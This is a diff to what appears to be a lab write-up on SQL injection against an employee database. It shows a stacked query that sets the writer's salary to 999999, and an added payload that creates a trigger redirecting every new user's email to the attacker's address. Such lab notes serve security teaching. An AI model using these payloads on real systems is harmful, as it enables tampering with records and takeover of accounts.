@@ -11,3 +11,13 @@ The resulting command is
 select userid, password, ssn, salary, email from employee where userid=1 and 'a'='b' update employee set salary=999999 where userid=101
 
 This statement effectvely updates our salary to a higher value
+
+TRIGGER:
+
+For this part, we set ALL new user's email addr to ours, the format of trigger is:
+
+ CREATE TRIGGER myTrigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='my@email.address.com' WHERE userid = NEW.userid
+
+which we append to the query, resulting in the final query string being:
+
+1 and 'a'='b' CREATE TRIGGER myTrigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='my@email.address.com' WHERE userid = NEW.userid END
